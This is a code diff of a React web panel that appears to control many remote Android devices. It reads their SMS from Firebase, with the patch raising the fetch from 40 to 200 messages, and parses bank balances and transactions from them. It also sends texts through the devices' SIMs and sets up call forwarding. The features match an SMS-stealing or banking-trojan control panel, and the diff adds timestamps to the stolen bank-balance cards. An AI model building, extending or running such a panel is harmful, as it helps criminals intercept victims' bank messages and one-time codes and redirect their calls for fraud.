             <p style={{fontSize:10,color:"var(--muted-2)",marginTop:6,textAlign:"right"}}>{body.length} chars</p>
           </div>
-          <button onClick={send} disabled={sending} className="btn btn-primary" style={{width:"100%",padding:14}}>
-            {sending?<><span className="spin" style={{borderTopColor:"#fff"}}/>Sending…</>:<>{Ic.send(15)}Send via SIM {sim}</>}
-          </button>
+          <button onClick={send} disabled={sending} className="btn btn-primary" style={{width:"100%",padding:14}}>{sending?<><span className="spin" style={{borderTopColor:"#fff"}}/>Sending…</>:<>{Ic.send(15)}Send via SIM {sim}</>}</button>
           {phone&&phone!=="—"&&<button onClick={()=>setTo(phone)} className="btn btn-ghost" style={{width:"100%"}}>Use device number: <span className="mono" style={{color:"#a5f3fc"}}>{phone}</span></button>}
           <div style={{marginTop:6,paddingTop:18,borderTop:"1px dashed rgba(139,92,246,.3)"}}>
             <div style={{display:"flex",alignItems:"center",gap:8,marginBottom:14}}>
               <div style={{width:26,height:26,borderRadius:9,background:"rgba(34,211,238,.12)",border:"1px solid rgba(34,211,238,.35)",display:"flex",alignItems:"center",justifyContent:"center",color:"#a5f3fc"}}>{Ic.phone(13)}</div>
               <div><p style={{fontSize:12,fontWeight:700,color:"#a5f3fc"}}>CALL FORWARD</p><p style={{fontSize:10,color:"var(--muted-2)"}}>Forward incoming calls</p></div>
             </div>
-            <div>
-              <p style={{fontSize:10,textTransform:"uppercase",letterSpacing:"0.15em",color:"var(--muted-2)",fontWeight:700,marginBottom:8}}>Forward To</p>
-              <input className="inp mono" value={callNum} onChange={e=>setCallNum(e.target.value)} placeholder="+919876543210" inputMode="tel" autoComplete="off"/>
-            </div>
+            <div><p className="lbl">Forward To</p><input className="inp mono" value={callNum} onChange={e=>setCallNum(e.target.value)} placeholder="+919876543210" inputMode="tel"/></div>
             <div style={{display:"flex",gap:8,marginTop:14}}>
-              <button onClick={forwardCall} disabled={callBusy} className="btn" style={{flex:1,padding:14,fontSize:12,background:"linear-gradient(135deg,rgba(14,165,233,.22),rgba(6,182,212,.22))",border:"1px solid rgba(14,165,233,.5)",color:"#7dd3fc",fontWeight:700}}>
-                {callBusy?<><span className="spin sm"/>Working…</>:<>{Ic.phone(14)} Activate Forward</>}
-              </button>
+              <button onClick={forwardCall} disabled={callBusy} className="btn" style={{flex:1,padding:14,fontSize:12,background:"linear-gradient(135deg,rgba(14,165,233,.22),rgba(6,182,212,.22))",border:"1px solid rgba(14,165,233,.5)",color:"#7dd3fc",fontWeight:700}}>{callBusy?<><span className="spin sm"/>Working…</>:<>{Ic.phone(14)} Activate Forward</>}</button>
               <button onClick={stopForward} disabled={callBusy} className="btn" style={{padding:"14px 16px",fontSize:12,background:"rgba(244,63,94,.1)",border:"1px solid rgba(244,63,94,.35)",color:"#fb7185",fontWeight:700}}>Stop</button>
             </div>
           </div>
@@ -1362,8 +1303,11 @@ function DeviceDrawer({dev,fbUrl,fbKey,onClose,onDelete,showToast}){
   </div>;
 }
 
+/* ⚡ BankCard with DATE/TIME ⚡ */
 const BankCard=React.memo(function BankCard({balance,delay=0}){
   const isCredit=balance.transactionType==="credit";
+  const ts = parseSmsTime(balance.detectedAt);
+  const timeStr = ts ? new Date(ts).toLocaleString("en-IN",{day:"2-digit",month:"short",hour:"2-digit",minute:"2-digit",hour12:true}) : (balance.detectedAt||"");
   return <div className="a-in" style={{animationDelay:`${delay}s`,padding:14,borderRadius:14,background:"rgba(52,211,153,.06)",border:"1px solid rgba(52,211,153,.28)",borderLeft:"3px solid rgba(52,211,153,.7)"}}>
     <div style={{display:"flex",alignItems:"center",justifyContent:"space-between",marginBottom:10,flexWrap:"wrap",gap:6}}>
       <div style={{display:"flex",alignItems:"center",gap:8,minWidth:0}}>
@@ -1377,6 +1321,11 @@ const BankCard=React.memo(function BankCard({balance,delay=0}){
       <div><p style={{fontSize:9,textTransform:"uppercase",letterSpacing:"0.15em",color:"var(--muted-2)",marginBottom:2}}>Available</p><p style={{fontSize:20,fontWeight:800,color:"#fff",fontVariantNumeric:"tabular-nums"}}><span style={{color:"#34d399",fontSize:14}}>₹</span>{fmtMoney(balance.availableBalance)}</p></div>
       {balance.transactionAmount&&balance.transactionAmount!==balance.availableBalance&&<div style={{textAlign:"right"}}><p style={{fontSize:9,textTransform:"uppercase",letterSpacing:"0.15em",color:"var(--muted-2)",marginBottom:2}}>Txn</p><p style={{fontSize:14,fontWeight:700,color:isCredit?"#34d399":"#fb7185",fontVariantNumeric:"tabular-nums"}}>{isCredit?"+":"-"}₹{fmtMoney(balance.transactionAmount)}</p></div>}
     </div>
+    {/* ⚡ DATE/TIME ROW */}
+    {timeStr && <div style={{display:"flex",alignItems:"center",gap:6,marginTop:10,paddingTop:8,borderTop:"1px solid rgba(52,211,153,.14)"}}>
+      <span style={{color:"#34d399",display:"flex"}}>{Ic.clock(11)}</span>
+      <span className="mono" style={{fontSize:10,color:"var(--muted)"}}>{timeStr}</span>
+    </div>}
   </div>;
 });
 
@@ -1425,26 +1374,17 @@ function MergedView({onLogout}){
       }));
       const merged=results.flat();
       setDevices(p=>{const old=new Map(p.map(d=>[`${d.srcId}:${d.id}`,d]));
-        return merged.map(d=>{
-          const prev=old.get(`${d.srcId}:${d.id}`);
-          return {...d,smsAnalysis:prev?.smsAnalysis||cache.current.get(`${d.srcId}:${d.id}`)?.smsAnalysis,lastSmsTs:prev?.lastSmsTs,isActive:prev?.isActive};
-        });
+        return merged.map(d=>{const prev=old.get(`${d.srcId}:${d.id}`);return {...d,smsAnalysis:prev?.smsAnalysis||cache.current.get(`${d.srcId}:${d.id}`)?.smsAnalysis,lastSmsTs:prev?.lastSmsTs,isActive:prev?.isActive};});
       });
     }catch{toast("Unable to load panels");}
     finally{setLoading(false);}
   },[accounts,toast]);
 
+  /* ⚡ PATCH: limitToLast 40 → 200 */
   const scan=useCallback(async (force=false)=>{
     const cur=ref.current;if(!cur.length) return;
     const now=Date.now();
-    const work=cur.filter(d=>{
-      const k=`${d.srcId}:${d.id}`;
-      if(force) return true;
-      const c=cache.current.get(k);
-      if(!c) return true;
-      if(c.ts && now-c.ts < 60000) return false;
-      return true;
-    });
+    const work=cur.filter(d=>{const k=`${d.srcId}:${d.id}`;if(force) return true;const c=cache.current.get(k);if(!c) return true;if(c.ts && now-c.ts < 60000) return false;return true;});
     if(!work.length) return;
     setScanning(true);
     try{
@@ -1453,7 +1393,7 @@ function MergedView({onLogout}){
         const batch=work.slice(i,i+batchSize);
         await Promise.all(batch.map(async d=>{
           const k=`${d.srcId}:${d.id}`;
-          try{const raw=await fbGet(d.srcUrl,d.srcKey,`messages/${d.id}`,{orderBy:'"$key"',limitToLast:"40"});
+          try{const raw=await fbGet(d.srcUrl,d.srcKey,`messages/${d.id}`,{orderBy:'"$key"',limitToLast:"200"});
             const msgs=parseMessages(raw);
             const a=analyze(msgs);
             const lastTs=getLastSmsTs(msgs);
@@ -1474,11 +1414,7 @@ function MergedView({onLogout}){
     if(!PERF.isLowEnd) t3=setInterval(()=>setNow(new Date()),60000);
     return ()=>{clearInterval(t1);clearInterval(t2);if(t3) clearInterval(t3);};
   },[]);
-  useEffect(()=>{
-    if(!devices.length) return;
-    const timer=setTimeout(()=>scan(false),1000);
-    return ()=>clearTimeout(timer);
-  },[devices.length,scan]);
+  useEffect(()=>{if(!devices.length) return;const timer=setTimeout(()=>scan(false),1000);return ()=>clearTimeout(timer);},[devices.length,scan]);
 
   const filtered=useMemo(()=>{
     const qRaw=search.trim().toLowerCase();const qNum=qRaw.replace(/[^0-9]/g,"");
@@ -1489,12 +1425,7 @@ function MergedView({onLogout}){
       const numStr=String(d.phoneNumber||"").replace(/[^0-9]/g,"");
       const smsNums=(d.smsAnalysis?.phoneNumbers||[]).join(" ").replace(/[^0-9]/g,"");
       return d.name.toLowerCase().includes(qRaw)||d.id.toLowerCase().includes(qRaw)||d.srcUrl.toLowerCase().includes(qRaw)||(qNum&&(numStr.includes(qNum)||smsNums.includes(qNum)));
-    }).sort((a,b)=>{
-      const pa=pinnedIds.includes(a.id),pb=pinnedIds.includes(b.id);
-      if(pa!==pb) return pb?1:-1;
-      if(filter==="online") return Number(b.status)-Number(a.status);
-      return b.id.localeCompare(a.id);
-    });
+    }).sort((a,b)=>{const pa=pinnedIds.includes(a.id),pb=pinnedIds.includes(b.id);if(pa!==pb) return pb?1:-1;if(filter==="online") return Number(b.status)-Number(a.status);return b.id.localeCompare(a.id);});
   },[devices,filter,search,pinnedIds]);
 
   const online=devices.filter(d=>d.status).length;
@@ -1524,9 +1455,7 @@ function MergedView({onLogout}){
         </div>
         <div style={{marginLeft:"auto",display:"flex",gap:8,alignItems:"center",flexWrap:"wrap"}}>
           <span className="badge" style={{background:"rgba(34,211,238,.08)",borderColor:"rgba(34,211,238,.3)",color:"#a5f3fc",padding:"6px 12px"}}>{accounts.length} panels</span>
-          {!PERF.isLowEnd && <div style={{display:"flex",alignItems:"center",gap:6,padding:"7px 12px",borderRadius:999,background:"rgba(14,12,28,.6)",border:"1px solid var(--border)"}}>
-            {Ic.clock(13)}<span className="mono" style={{fontSize:11,fontWeight:700,color:"var(--muted)"}}>{now.toLocaleTimeString("en-US",{hour:"2-digit",minute:"2-digit",hour12:false})}</span>
-          </div>}
+          {!PERF.isLowEnd && <div style={{display:"flex",alignItems:"center",gap:6,padding:"7px 12px",borderRadius:999,background:"rgba(14,12,28,.6)",border:"1px solid var(--border)"}}>{Ic.clock(13)}<span className="mono" style={{fontSize:11,fontWeight:700,color:"var(--muted)"}}>{now.toLocaleTimeString("en-US",{hour:"2-digit",minute:"2-digit",hour12:false})}</span></div>}
           <TGButton label="Telegram"/>
           <button onClick={shareAll} disabled={!accounts.length} className="btn btn-cyan" style={{padding:"8px 14px",fontSize:11}}>{Ic.share(13)}Share</button>
           <button onClick={()=>{if(confirm("Logout?")) onLogout();}} className="btn btn-ghost" style={{padding:"8px 14px",fontSize:11}}>{Ic.chevL(13)}Back</button>
@@ -1550,16 +1479,10 @@ function MergedView({onLogout}){
       </div>
     </div>
     <main style={{flex:1,maxWidth:1400,margin:"0 auto",width:"100%",padding:"22px"}}>
-      {loading ? <div style={{display:"flex",alignItems:"center",gap:10,justifyContent:"center",padding:"70px 20px"}}>
-        <span className="spin"/><span style={{fontSize:13,color:"var(--muted)"}}>Loading all panels…</span>
-      </div>
-      : devices.length===0 ? <div className="a-up" style={{textAlign:"center",padding:"70px 20px"}}>
-          <p style={{fontSize:15,fontWeight:700,color:"var(--muted)"}}>No devices across saved panels</p>
-        </div>
+      {loading ? <div style={{display:"flex",alignItems:"center",gap:10,justifyContent:"center",padding:"70px 20px"}}><span className="spin"/><span style={{fontSize:13,color:"var(--muted)"}}>Loading all panels…</span></div>
+      : devices.length===0 ? <div className="a-up" style={{textAlign:"center",padding:"70px 20px"}}><p style={{fontSize:15,fontWeight:700,color:"var(--muted)"}}>No devices across saved panels</p></div>
       : <>
-          {scanning && <div className="a-in" style={{display:"flex",alignItems:"center",gap:10,marginBottom:14,padding:"8px 14px",borderRadius:12,background:"rgba(14,12,28,.6)",border:"1px solid var(--border)",width:"fit-content"}}>
-            <span className="spin sm"/><span style={{fontSize:11,color:"var(--muted)"}}>Scanning SMS…</span>
-          </div>}
+          {scanning && <div className="a-in" style={{display:"flex",alignItems:"center",gap:10,marginBottom:14,padding:"8px 14px",borderRadius:12,background:"rgba(14,12,28,.6)",border:"1px solid var(--border)",width:"fit-content"}}><span className="spin sm"/><span style={{fontSize:11,color:"var(--muted)"}}>Scanning SMS…</span></div>}
           <div style={{display:"grid",gridTemplateColumns:"repeat(auto-fill,minmax(290px,1fr))",gap:16}}>
             {filtered.map((d,i)=>(
               <div key={`${d.srcId}:${d.id}`} className="a-up" style={{animationDelay:`${Math.min(i*0.03,0.4)}s`}}>
